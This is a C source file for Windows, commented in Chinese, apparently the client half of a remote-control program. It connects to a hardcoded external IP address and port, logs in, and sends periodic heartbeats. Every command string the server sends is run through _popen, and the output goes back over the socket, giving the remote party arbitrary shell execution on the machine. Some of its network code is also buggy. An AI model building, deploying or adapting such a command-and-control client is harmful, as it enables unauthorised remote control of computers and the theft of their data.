//被控制端:接收服务器的命令，将执行命令的结果返回给服务器
//windows version (default linux version)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <synchapi.h>
#pragma comment(lib, "Ws2_32.lib")

#define MSG_TYPE_LOGIN                          (0)
#define MSG_TYPE_LOGIN_RESULT                   (1)
#define MSG_TYPE_LOGIN_OUT                      (2)
#define MSG_TYPE_HEART                          (3)
#define MSG_TYPE_COMMD                          (4)
#define MSG_TYPE_COMMD_RESULT                   (5)
#define MSG_TYPE_COMMD_LIST_CLIENT              (6)
#define MSG_TYPE_COMMD_LIST_CLIENT_RESULT       (7)


#define SERVER_IP                           ("139.196.120.117")
#define SERVER_PORT                         (8090)

#define LOGIN_TYPE_CLIENT                   (0)
#define LOGIN_TYPE_CONTROL                  (1)

#define LOGIN_STATE_SUCCESS                 (1)
#define LOGIN_STATE_FAILURE                 (0)

#define HEART_BEAT_INTERVAL                 (30 * 1000)

typedef struct MSG {
      int type;
      int length;
}__MSG;
  
 
struct login {
    __MSG msg;
    char type;
    char user[32];
    char password[32];
};

struct login_result {
    __MSG msg;
    int code;
    char msgstr[256];
};

struct heartbeat {
    __MSG msg;
    long long time;
};

struct commd {
    __MSG msg;
    char commdstr[256];
};

struct commd_result {
    __MSG msg;
    char commdstr[256];
};




void    connect_server(struct sockaddr_in *server_addr, SOCKET sockfd);
void    do_login(SOCKET sockfd);
void    send_heartbeat(void *arg); 
void    do_implement(SOCKET sockfd);
char*   readtobuf(char *resultbuf, FILE *fp);
int     recv_full(SOCKET sockfd, char *buf, int len);
int     send_full(SOCKET sockfd, char *buf, int len);
int     recv_tlv_buffer(SOCKET sockfd, char *buf);
int     send_tlv_buffer(SOCKET sockfd, char *buf);
char*   get_command(struct commd *command_packge);
void    send_result_packge(SOCKET sockfd, char *cmdbuf);
void    send_login_packge(SOCKET sockfd, char *sendbuf);
void    print_login_result(char *buf);

int main() 
{
    int WSAret;
    WSADATA WSAdata;
    SOCKET connectfd = INVALID_SOCKET;
    struct sockaddr_in server_addr;
    HANDLE ht_thread;
    DWORD ht_threadid;
    
    WSAret = WSAStartup(MAKEWORD(2,2), &WSAdata);
    if (WSAret != NO_ERROR) {
        wprintf(L"WSAStartup failed with error: %d\n", WSAret);
        return 1;
    }
    
    connectfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (connectfd == INVALID_SOCKET) {
        wprintf(L"socket failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    //connect server
    connect_server(&server_addr, connectfd);
    
    //login
    do_login(connectfd);
    
    //send heartbeat
    
    ht_thread = CreateThread(NULL, 0, (void *)send_heartbeat, &connectfd, 0, &ht_threadid);

    if(ht_thread == NULL) {
        wprintf(L"heart beat thread create error:%d\n", GetLastError());
        exit(1);
    }

    if(WaitForSingleObject(ht_thread, 0 ) == WAIT_FAILED) {
        wprintf(L"WaitForSingleObject failed! error:%d\n", GetLastError());
        exit(1);
    }

    //implement command and return the result to the server
    do_implement(connectfd);

    if(closesocket(connectfd) == SOCKET_ERROR) {
        wprintf(L"close failed with error:%d\n", WSAGetLastError());
        WSACleanup();
    }
    WSACleanup();

    return 0;
}


void connect_server(struct sockaddr_in *server_addr, SOCKET sockfd)
{
    server_addr->sin_family = AF_INET;
    server_addr->sin_addr.s_addr = inet_addr(SERVER_IP);
    server_addr->sin_port = htons(SERVER_PORT);
    
    if(connect(sockfd, (SOCKADDR *)server_addr, (int)sizeof(*server_addr)) == SOCKET_ERROR ) {
        wprintf(L"connect failed with error: %d\n", WSAGetLastError());
        closesocket(sockfd);
        WSACleanup();
        exit(-1);
    } else {
        wprintf(L"connect successfully\n");
    }
}

void do_login(SOCKET sockfd)
{
    char buf[300];   
    
    memset(buf, 0, 300);
    wprintf(L"sending login_packge...\n");
    send_login_packge(sockfd, buf);
    
    wprintf(L"has send login_packge \n");
    
    wprintf(L"recving login_result ...\n");
    
    memset(buf, 0, 300);

    if(recv_tlv_buffer(sockfd, (char *)buf) == 0) {
        wprintf(L"recv login_result failure!\n");
        closesocket(sockfd);
        WSACleanup();
        exit(0);
    }
    
    wprintf(L"recv login result successfully\n");
    print_login_result((char *)buf);
    
    return ;
}

void send_login_packge(SOCKET sockfd, char *sendbuf)
{
    int i;
    struct login *login = (struct login *)sendbuf;
    
    login->msg.type = MSG_TYPE_LOGIN;
    login->msg.length = 64 + 1;
    login->type = LOGIN_TYPE_CLIENT;
    
    for(i = 0; i < 32; i++) {
        login->user[i] = 0xff;
    }

    for (i = 0; i < 32; i++) {
        login->password[i] = 0xff;
    }
    
    send_tlv_buffer(sockfd, (char *)sendbuf);
    
    return ;
}

void print_login_result(char *buf)
{
    struct login_result *login_result = (struct login_result *)buf;
    
    if(login_result->code == LOGIN_STATE_SUCCESS) {
        wprintf(L"%s\n", login_result->msgstr);
    } else {
        
        wprintf(L"login failure\n");
    }
    
    return ;
}

void send_heartbeat(void *arg) 
{
    SOCKET sockfd = *(SOCKET *)arg;
    char sendbuf[16];
    struct heartbeat *heartbeat_packge = (struct heartbeat *)sendbuf;
    
    memset(sendbuf, 0, 16);
    heartbeat_packge->msg.type = MSG_TYPE_HEART;
    heartbeat_packge->msg.length = sizeof(long long);
    heartbeat_packge->time = time(NULL);
    
    while(1) {
        
        Sleep(HEART_BEAT_INTERVAL);
        send_tlv_buffer(sockfd, (char *)sendbuf);
        
    }

    return ;
}

void do_implement(SOCKET sockfd)
{
    __MSG *msg = NULL;    
    char cmdbuf[256];
    char recvbuf[256 + 8];
    
    msg = (__MSG *)recvbuf;

    while(1) {
        memset(recvbuf, 0, sizeof(recvbuf));
        memset(cmdbuf, 0, sizeof(cmdbuf));
                    
                    
        if(recv_tlv_buffer(sockfd, (char *)recvbuf) == 0) {
            wprintf(L"recv command failure!\n");
            break;
        }
        
        if(msg->type == MSG_TYPE_COMMD) {

            strncpy(cmdbuf, get_command((struct commd *)recvbuf), 256);
            
            wprintf(L"from server command: %s\n", cmdbuf);
            send_result_packge(sockfd, cmdbuf);
        }
    } 

    return ;   
}


char *get_command(struct commd *command_packge)
{
    return command_packge->commdstr;
}

void send_result_packge(SOCKET sockfd, char *cmdbuf)
{
    FILE *fp = NULL;
    char sendbuf[4096];
    char *pbuf = sendbuf;
    __MSG *msg = (__MSG *)sendbuf;
    
    memset(sendbuf, 0, 4096);
    
    fp = _popen(cmdbuf, "r");
    
    readtobuf(&pbuf[8], fp);
    
    _pclose(fp);
    
    msg->type = MSG_TYPE_COMMD_RESULT;
    msg->length = 256 - 8;
    
    send_tlv_buffer(sockfd, (char *)sendbuf);
}


char* readtobuf(char *resultbuf, FILE *fp) 
{
    
    fread(resultbuf, 1, 256 - 8, fp);
    
    wprintf(L"%s\n", resultbuf);
    
    return resultbuf;
}



int recv_full(SOCKET sockfd, char *buf, int len)
{
    int hasrecv = 0;
    int ret;
    
    while(hasrecv < len) {
        
        if( (ret = recv(sockfd, buf, len, 0)) > 0) {
            hasrecv = hasrecv + ret;
        } else if(ret == 0) {
            wprintf(L"peer server is shutdown\n");
            break;
        } else {
            wprintf(L"recv failure with error: %d\n", WSAGetLastError());
            break;
        }
    }
    


    return hasrecv;
}

int recv_tlv_buffer(SOCKET sockfd, char *buf)
{
    int n = 0;
    int ret = 0;
    int recvheadflag = 0;
    char *pbuf = buf;
    int headlen = sizeof(__MSG);
    __MSG *msg = (__MSG *)buf;
    
    if((n = recv_full(sockfd, pbuf, headlen)) > 0) {//记得打括号
        if(n == headlen) {
            recvheadflag = 1;
            wprintf(L"recv the MSG head:%d bytes\n", n);
            ret = 1;
        } else {
            ret = 0;
        }
    }
    if((recvheadflag) && (msg->length)) {
        if((n = recv_full(sockfd, &pbuf[headlen], msg->length)) > 0) {
            if(n == msg->length) {
                wprintf(L"recv the MSG tail:%d bytes\n", n);
                ret = 1;
            } else {
                ret = 0;
            }
        }
    }

    return ret;
}

int send_full(SOCKET sockfd, char *buf, int len)
{
    int hassend = 0;
    int ret;

    while(hassend < len) {

        if( (ret = send(sockfd, buf, len, 0)) > 0 ) {
            hassend = hassend + ret;                      
        } else if (ret == 0) {
            wprintf(L"peer shutdown!\n");
            break;
        } else {
            wprintf(L"send fairlure with error :%d\n", WSAGetLastError());
            break;
        }
    }



    return hassend;
}

int send_tlv_buffer(SOCKET sockfd, char *buf)
{
    int ret = 0;
    int n = 0;
    int sendheadflag = 0;
    char *pbuf = buf;
    int headlen = sizeof(__MSG);
    __MSG *msg = (__MSG *)buf;
    
    if((n = send_full(sockfd, pbuf, headlen)) > 0) {
        if(n == headlen) {
            wprintf(L"send the msg head\n");
            sendheadflag = 1;
            ret = 1;
        } else {
            ret = 0;
        }
    }
    
    if((sendheadflag)&& (msg->length)) {
        if((n = send_full(sockfd, &pbuf[headlen], msg->length)) > 0) {
            if(n == msg->length) {
                wprintf(L"send the msg tail\n");
                ret = 1;
            } else {
                ret = 0;
            }
        }
    }
    
    return ret;
}





